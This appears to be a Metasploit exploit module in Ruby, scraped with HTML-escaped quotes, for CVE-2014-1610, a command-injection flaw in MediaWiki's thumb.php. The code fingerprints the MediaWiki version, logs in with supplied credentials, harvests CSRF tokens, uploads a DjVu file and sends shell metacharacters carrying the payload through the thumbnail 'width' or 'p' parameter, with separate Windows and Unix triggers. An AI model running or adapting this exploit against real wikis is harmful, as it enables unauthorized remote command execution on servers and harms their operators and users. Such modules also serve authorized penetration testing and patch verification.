 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;MediaWiki Thumb.php Remote Command Execution&#039;,
      &#039;Description&#039; => %q{
        MediaWiki 1.22.x before 1.22.2, 1.21.x before 1.21.5 and 1.19.x before 1.19.11,
      when DjVu  or PDF file upload support is enabled, allows remote unauthenticated
      users to execute arbitrary commands via shell metacharacters. If no target file
      is specified this module will attempt to log in with the provided credentials to
      upload a file (.DjVu) to use for exploitation.
      },
      &#039;Author&#039; =>
        [
          &#039;Netanel Rubin&#039;, # from Check Point - Discovery
          &#039;Brandon Perry&#039;, # Metasploit Module
          &#039;Ben Harris&#039;, # Metasploit Module
          &#039;Ben Campbell <eat_meatballs[at]hotmail.co.uk>&#039; # Metasploit Module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [ &#039;CVE&#039;, &#039;2014-1610&#039; ],
          [ &#039;OSVDB&#039;, &#039;102630&#039;],
          [ &#039;URL&#039;, &#039;http://www.checkpoint.com/threatcloud-central/articles/2014-01-28-tc-researchers-discover.html&#039; ],
          [ &#039;URL&#039;, &#039;https://bugzilla.wikimedia.org/show_bug.cgi?id=60339&#039; ]
        ],
      &#039;Privileged&#039; => false,
      &#039;Targets&#039; =>
        [
          [ &#039;Automatic PHP-CLI&#039;,
            {
              &#039;Payload&#039; =>
                {
                  &#039;BadChars&#039; => "\r\n",
                  &#039;PrependEncoder&#039; => "php -r \"",
                  &#039;AppendEncoder&#039; => "\""
                },
              &#039;Platform&#039; => [&#039;php&#039;],
              &#039;Arch&#039; => ARCH_PHP
            }
          ],
          [ &#039;Linux CMD&#039;,
            {
              &#039;Payload&#039;        =>
                {
                  &#039;BadChars&#039; => "",
                  &#039;Compat&#039;      =>
                    {
                      &#039;PayloadType&#039; => &#039;cmd&#039;,
                      &#039;RequiredCmd&#039; => &#039;generic perl python php&#039;,
                    }
                },
              &#039;Platform&#039; => [&#039;unix&#039;],
              &#039;Arch&#039; => ARCH_CMD
            }
          ],
          [ &#039;Windows CMD&#039;,
            {
              &#039;Payload&#039;        =>
                {
                  &#039;BadChars&#039; => "",
                  &#039;Compat&#039;      =>
                    {
                      &#039;PayloadType&#039; => &#039;cmd&#039;,
                      &#039;RequiredCmd&#039; => &#039;generic perl&#039;,
                    }
                },
              &#039;Platform&#039; => [&#039;win&#039;],
              &#039;Arch&#039; => ARCH_CMD
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jan 28 2014&#039;))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base MediaWiki path", &#039;/mediawiki&#039; ]),
        OptString.new(&#039;FILENAME&#039;, [ false, "Target DjVu/PDF file (e.g target.djvu target.pdf)", nil ]),
        OptString.new(&#039;USERNAME&#039;, [ false, "Username to authenticate with", &#039;&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ false, "Password to authenticate with", &#039;&#039; ])
      ], self.class)
  end
 
  def get_version(body)
    meta_generator = get_html_value(body, &#039;meta&#039;, &#039;generator&#039;, &#039;content&#039;)
 
    unless meta_generator
      vprint_status("No META Generator tag on #{full_uri}.")
      return nil, nil, nil
    end
 
    if meta_generator && meta_generator =~ /mediawiki/i
      vprint_status("#{meta_generator} detected.")
      meta_generator =~ /(\d)\.(\d+)[\.A-z]+(\d+)/
      major = $1.to_i
      minor = $2.to_i
      patch = $3.to_i
      vprint_status("Major:#{major} Minor:#{minor} Patch:#{patch}")
 
      return major, minor, patch
    end
 
    return nil, nil, nil
  end
 
  def check
    uri = target_uri.path
 
    opts = { &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;) }
 
    response = send_request_cgi!(opts)
 
    if opts[&#039;redirect_uri&#039;]
      vprint_status("Redirected to #{opts[&#039;redirect_uri&#039;]}.")
    end
 
    unless response
      vprint_status("No response from #{full_uri}.")
      return CheckCode::Unknown
    end
 
    # Mediawiki will give a 404 for unknown pages but still have a body
    if response.code == 200 || response.code == 404
      vprint_status("#{response.code} response received...")
 
      major, minor, patch = get_version(response.body)
 
      unless major
        return CheckCode::Unknown
      end
 
      if major == 1 && (minor < 8 || minor > 22)
        return CheckCode::Safe
      elsif major == 1 && (minor == 22 && patch > 1)
        return CheckCode::Safe
      elsif major == 1 && (minor == 21 && patch > 4)
        return CheckCode::Safe
      elsif major == 1 && (minor == 19 && patch > 10)
        return CheckCode::Safe
      elsif major == 1
        return CheckCode::Appears
      else
        return CheckCode::Safe
      end
    end
 
    vprint_status("Received response code #{response.code} from #{full_uri}")
    CheckCode::Unknown
  end
 
  def exploit
    uri = target_uri.path
 
    print_status("Grabbing version and login CSRF token...")
    response = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;vars_get&#039; => { &#039;title&#039; => &#039;Special:UserLogin&#039; }
    })
 
    unless response
      fail_with(Failure::NotFound, "Failed to retrieve webpage.")
    end
 
    server = response[&#039;Server&#039;]
    if server && target.name =~ /automatic/i && server =~ /win32/i
      vprint_status("Windows platform detected: #{server}.")
      my_platform = Msf::Module::Platform::Windows
    elsif server && target.name =~ /automatic/i
      vprint_status("Nix platform detected: #{server}.")
      my_platform = Msf::Module::Platform::Unix
    else
      my_platform = target.platform.platforms.first
    end
 
    # If we have already identified a DjVu/PDF file on the server trigger
    # the exploit
    unless datastore[&#039;FILENAME&#039;].blank?
      payload_request(uri, datastore[&#039;FILENAME&#039;], my_platform)
      return
    end
 
    username = datastore[&#039;USERNAME&#039;]
    password = datastore[&#039;PASSWORD&#039;]
 
    major, minor, patch = get_version(response.body)
 
    # Upload CSRF added in v1.18.2
    # http://www.mediawiki.org/wiki/Release_notes/1.18#Changes_since_1.18.1
    if ((major == 1) && (minor == 18) && (patch == 0 || patch == 1))
      upload_csrf = false
    elsif ((major == 1) && (minor < 18))
      upload_csrf = false
    else
      upload_csrf = true
    end
 
    session_cookie = response.get_cookies
 
    wp_login_token = get_html_value(response.body, &#039;input&#039;, &#039;wpLoginToken&#039;, &#039;value&#039;)
 
    if wp_login_token.blank?
      fail_with(Failure::UnexpectedReply, "Couldn&#039;t find login token. Is URI set correctly?")
    else
      print_good("Retrieved login CSRF token.")
    end
 
    print_status("Attempting to login...")
    login = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_get&#039; => {
        &#039;title&#039; => &#039;Special:UserLogin&#039;,
        &#039;action&#039; => &#039;submitlogin&#039;,
        &#039;type&#039; => &#039;login&#039;
      },
      &#039;cookie&#039; => session_cookie,
      &#039;vars_post&#039; => {
        &#039;wpName&#039; => username,
        &#039;wpPassword&#039; => password,
        &#039;wpLoginAttempt&#039; => &#039;Log in&#039;,
        &#039;wpLoginToken&#039; => wp_login_token
      }
    })
 
    if login and login.code == 302
      print_good("Log in successful.")
    else
      fail_with(Failure::NoAccess, "Failed to log in.")
    end
 
    auth_cookie = login.get_cookies.gsub(&#039;mediawikiToken=deleted;&#039;,&#039;&#039;)
 
    # Testing v1.15.1 it looks like it has session fixation
    # vulnerability so we dont get a new session cookie after
    # authenticating. Therefore we need to include our old cookie.
    unless auth_cookie.include? &#039;session=&#039;
      auth_cookie << session_cookie
    end
 
    print_status("Getting upload CSRF token...") if upload_csrf
    upload_file = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;, &#039;Special:Upload&#039;),
      &#039;cookie&#039; => auth_cookie
    })
 
    unless upload_file and upload_file.code == 200
      fail_with(Failure::NotFound, "Failed to access file upload page.")
    end
 
    wp_edit_token = get_html_value(upload_file.body, &#039;input&#039;, &#039;wpEditToken&#039;, &#039;value&#039;) if upload_csrf
    wp_upload = get_html_value(upload_file.body, &#039;input&#039;, &#039;wpUpload&#039;, &#039;value&#039;)
    title = get_html_value(upload_file.body, &#039;input&#039;, &#039;title&#039;, &#039;value&#039;)
 
    if upload_csrf && wp_edit_token.blank?
      fail_with(Failure::UnexpectedReply, "Couldn&#039;t find upload token. Is URI set correctly?")
    elsif upload_csrf
      print_good("Retrieved upload CSRF token.")
    end
 
    upload_mime = Rex::MIME::Message.new
 
    djvu_file = ::File.read(::File.join(Msf::Config.data_directory, "exploits", "cve-2014-1610", "metasploit.djvu"))
    file_name = "#{rand_text_alpha(4)}.djvu"
 
    upload_mime.add_part(djvu_file, "application/octet-stream", "binary", "form-data; name=\"wpUploadFile\"; filename=\"#{file_name}\"")
    upload_mime.add_part("#{file_name}", nil, nil, "form-data; name=\"wpDestFile\"")
    upload_mime.add_part("#{rand_text_alpha(4)}", nil, nil, "form-data; name=\"wpUploadDescription\"")
    upload_mime.add_part("", nil, nil, "form-data; name=\"wpLicense\"")
    upload_mime.add_part("1",nil,nil, "form-data; name=\"wpIgnoreWarning\"")
    upload_mime.add_part(wp_edit_token, nil, nil, "form-data; name=\"wpEditToken\"") if upload_csrf
    upload_mime.add_part(title, nil, nil, "form-data; name=\"title\"")
    upload_mime.add_part("1", nil, nil, "form-data; name=\"wpDestFileWarningAck\"")
    upload_mime.add_part(wp_upload, nil, nil, "form-data; name=\"wpUpload\"")
    post_data = upload_mime.to_s
 
    print_status("Uploading DjVu file #{file_name}...")
 
    upload = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;, &#039;Special:Upload&#039;),
      &#039;data&#039;   => post_data,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{upload_mime.bound}",
      &#039;cookie&#039; => auth_cookie
    })
 
    if upload and upload.code == 302 and upload.headers[&#039;Location&#039;]
      location = upload.headers[&#039;Location&#039;]
      print_good("File uploaded to #{location}")
    else
      if upload.body.include? &#039;not a permitted file type&#039;
        fail_with(Failure::NotVulnerable, "Wiki is not configured for target files.")
      else
        fail_with(Failure::UnexpectedReply, "Failed to upload file.")
      end
    end
 
    payload_request(uri, file_name, my_platform)
  end
 
  def payload_request(uri, file_name, my_platform)
    if my_platform == Msf::Module::Platform::Windows
      trigger = "1)&(#{payload.encoded})&"
    else
      trigger = "1;#{payload.encoded};"
    end
 
    vars_get = { &#039;f&#039; => file_name }
    if file_name.include? &#039;.pdf&#039;
      vars_get[&#039;width&#039;] = trigger
    elsif file_name.include? &#039;.djvu&#039;
      vars_get[&#039;width&#039;] = 1
      vars_get[&#039;p&#039;] = trigger
    else
      fail_with(Failure::BadConfig, "Unsupported file extension: #{file_name}")
    end
 
    print_status("Sending payload request...")
    r = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;thumb.php&#039;),
      &#039;vars_get&#039; => vars_get
    }, 1)
 
    if r && r.code == 404 && r.body =~ /not exist/
      print_error("File: #{file_name} does not exist.")
    elsif r
      print_error("Received response #{r.code}, exploit probably failed.")
    end
  end
 
  # The order of name, value keeps shifting so regex is painful.
  # Cant use nokogiri due to security issues
  # Cant use REXML directly as its not strict XHTML
  # So we do a filthy mixture of regex and REXML
  def get_html_value(html, type, name, value)
    return nil unless html
    return nil unless type
    return nil unless name
    return nil unless value
 
    found = nil
    html.each_line do |line|
      if line =~ /(<#{type}[^\/]*name="#{name}".*?\/>)/i
        found = $&
        break
      end
    end
 
    if found
      doc = REXML::Document.new found
      return doc.root.attributes[value]
    end
 
    &#039;&#039;
  end
end

